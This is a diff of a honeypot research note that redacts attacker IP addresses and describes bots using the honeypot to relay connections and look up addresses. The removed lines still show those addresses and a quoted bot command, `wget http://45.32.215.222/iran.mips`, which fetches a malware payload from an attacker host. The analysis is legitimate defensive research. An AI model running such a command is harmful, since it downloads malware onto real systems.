@@ -1,5 +1,13 @@
 # The first four days — 25 to 29 September 2026
 
+> **Addresses redacted 6 October 2026.** Source addresses in this note were
+> published in full from its first version until 6 October, against the
+> rules-of-engagement statement that no individual address appears in this
+> repository. They are now stable labels — `<source-N>`, `<relay-destination>`,
+> `<payload-host>` — consistent across every document; the behaviour described
+> is unchanged. Recorded in `docs/rules-of-engagement.md` as the third
+> self-violation.
+
 **This note replaces an earlier version that was wrong about its own scope.**
 The earlier version was titled "the first weekend" and reported 14,845 events
 from 93 sources. Those figures came from reading a single file, `cowrie.json`,
@@ -185,8 +193,8 @@ IP address:
 
 | Source | Asked us to fetch | When | Requests |
 |---|---|---|---|
-| `171.243.149.238` | `ip-who.com` | 26 Sept 13:29 → 28 Sept 02:44 | 11 |
-| `94.154.43.234` | `ipv4.icanhazip.com` | 26 Sept 20:36 | 1 |
+| `<source-5>` | `ip-who.com` | 26 Sept 13:29 → 28 Sept 02:44 | 11 |
+| `<source-6>` | `ipv4.icanhazip.com` | 26 Sept 20:36 | 1 |
 
 That is **casing the joint**. They were not interested in our machine or
 anything on it. They wanted to know what the rest of the internet would see if
@@ -200,7 +208,7 @@ The third did something else entirely:
 
 | Source | Asked us to connect to | When | Requests |
 |---|---|---|---|
-| `193.46.255.86` | `62.210.131.144` port 2535 | 28 Sept 08:00 → 10:46 | 2 |
+| `<source-7>` | `<relay-destination>` port 2535 | 28 Sept 08:00 → 10:46 | 2 |
 
 That is not a question about itself. It is an attempt to open a connection to
 one specific machine somewhere else, through ours. **Both halves of the abuse
@@ -251,9 +259,9 @@ suspected and is worth recording as such.
 
 | Source | Asked us to connect to | Forward requests | Sessions | First seen | Last seen |
 |---|---|---|---|---|---|
-| `171.243.149.238` | `ip-who.com:80` | 14 | 14 | 26 Sept 13:29 | 29 Sept 11:47 |
-| `193.46.255.86` | `62.210.131.144:2535` | 3 | 3 | 28 Sept 08:00 | 29 Sept 16:20 |
-| `94.154.43.234` | `ipv4.icanhazip.com:443` | 1 | 1 | 26 Sept 20:36 | 26 Sept 20:36 |
+| `<source-5>` | `ip-who.com:80` | 14 | 14 | 26 Sept 13:29 | 29 Sept 11:47 |
+| `<source-7>` | `<relay-destination>:2535` | 3 | 3 | 28 Sept 08:00 | 29 Sept 16:20 |
+| `<source-6>` | `ipv4.icanhazip.com:443` | 1 | 1 | 26 Sept 20:36 | 26 Sept 20:36 |
 
 **18 forward requests in total, from 3 sources, over 4 days.** An earlier version
 of this note said "fourteen times over three days" — that was one source's count
@@ -270,7 +278,7 @@ encrypted-looking blob because the server name travels in clear text at the star
 of the negotiation — which is how we know what it was reaching for without being
 able to read the rest.
 
-**The third is not asking about itself.** `62.210.131.144:2535` is one specific
+**The third is not asking about itself.** `<relay-destination>:2535` is one specific
 machine on an unusual port. Notably it sent **no data at all** — three connection
 requests and nothing to forward, where the other two both sent payloads. A
 request with no payload is consistent with testing whether the relay works before
@@ -321,7 +329,7 @@ audience asks and which very few small-scale projects can answer at all.
 ### The part that cost us
 
 Cowrie does not pretend to download things. When a bot typed
-`wget http://45.32.215.222/iran.mips`, our machine really went to that address
+`wget http://<payload-host>/iran.mips`, our machine really went to that address
 and fetched the file. Over four days that is **153 outbound connections to 8
 attacker-controlled hosts**.
 
